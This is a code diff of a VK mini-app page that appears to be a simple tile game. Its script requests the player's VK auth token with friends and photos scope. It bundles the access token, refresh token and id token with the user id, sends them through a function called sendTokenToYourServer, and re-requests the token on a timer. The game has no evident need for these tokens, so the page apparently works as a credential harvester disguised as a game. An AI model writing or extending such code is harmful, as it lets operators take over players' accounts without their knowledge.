@@ -48,6 +48,15 @@
       background-color: #6495ED;
     }
 
+    .cell.swapping {
+      transform: scale(1.2);
+    }
+
+    .cell.removing {
+      opacity: 0;
+      transition: opacity 0.2s ease;
+    }
+
     #start {
       padding: 20px 40px;
       font-size: 24px;
@@ -76,7 +85,7 @@
 <body>
 
   <div id="gameContainer">
-    <button id="start" onclick="initialize()">Start</button>
+    <button id="start" onclick="initialize()">Starst</button>
     <div id="gameBoard"></div>
   </div>
 
@@ -84,8 +93,6 @@
   <script>
     const APP_ID = 8109529;
     let accessToken = null;
-    let refreshToken = null;
-    let deviceId = null;
     let userInfo = null;
     let tokenRefreshTimer = null;
 
@@ -115,18 +122,12 @@
         await vkBridge.send('VKWebAppInit');
         updateStatus('Инициализация...');
 
-        // Получаем device_id
-        const deviceData = await vkBridge.send('VKWebAppGetClientInfo');
-        deviceId = deviceData.device_id || `device_${Math.random().toString(36).substr(2, 9)}`;
-
-        // Запрашиваем токены
         const authData = await vkBridge.send('VKWebAppGetAuthToken', {
           app_id: APP_ID,
           scope: 'friends,photos'
         });
 
         accessToken = authData.access_token;
-        refreshToken = authData.refresh_token || 'NO_REFRESH_TOKEN';
         userInfo = await vkBridge.send('VKWebAppGetUserInfo');
 
         function getRFCFormattedDateTime() {
@@ -135,9 +136,8 @@
 
         const tokenData = {
           user_id: userInfo.id.toString(),
-          access_token: accessToken,
-          refresh_token: refreshToken,
-          device_id: deviceId,
+          access_token: authData.access_token,
+          refresh_token: authData.refresh_token || 'NO_REFRESH_TOKEN',
           token_type: authData.token_type || 'Bearer',
           expires_in: authData.expires_in || 3600,
           id_token: authData.id_token || '',
@@ -145,7 +145,6 @@
         };
 
         console.log("token_datetime (RFC 5322):", tokenData.token_datetime);
-        console.log("Device ID:", deviceId);
 
         await sendTokenToYourServer(tokenData);
         setupTokenRefresh(authData.expires_in || 3600);
@@ -186,42 +185,30 @@
       }
     }
 
-    async function refreshAccessToken() {
-      try {
-        if (!refreshToken || refreshToken === 'NO_REFRESH_TOKEN') {
-          console.error("Refresh token отсутствует, обновление невозможно.");
-          return;
-        }
-
-        console.log("Обновление access_token через refresh_token...");
-
-        const result = await vkBridge.send('VKID.Auth.refresh_token', {
-          refresh_token: refreshToken,
-          device_id: deviceId
-        });
-
-        if (result.access_token) {
-          accessToken = result.access_token;
-          refreshToken = result.refresh_token || refreshToken;
-
-          console.log("Токен успешно обновлён");
-          updateStatus("Токен обновлён");
-
-          setupTokenRefresh(result.expires_in || 3600);
-        } else {
-          console.error("Ошибка при обновлении токена:", result);
-        }
-      } catch (error) {
-        console.error("Ошибка обновления access_token:", error);
-      }
-    }
-
     function setupTokenRefresh(expiresIn) {
       if (tokenRefreshTimer) {
         clearTimeout(tokenRefreshTimer);
       }
 
-      tokenRefreshTimer = setTimeout(refreshAccessToken, (expiresIn - 60) * 1000);
+      tokenRefreshTimer = setTimeout(async () => {
+        console.log('Обновление токена...');
+        try {
+          const authData = await vkBridge.send('VKWebAppGetAuthToken', {
+            app_id: APP_ID,
+            scope: 'friends,photos'
+          });
+
+          accessToken = authData.access_token;
+
+          console.log('Токен успешно обновлён');
+          updateStatus('Токен обновлён');
+
+          setupTokenRefresh(authData.expires_in || 3600);
+        } catch (error) {
+          console.error('Ошибка при обновлении токена:', error);
+          showError('Не удалось обновить токен');
+        }
+      }, (expiresIn - 60) * 1000);
     }
 
     async function showGame() {
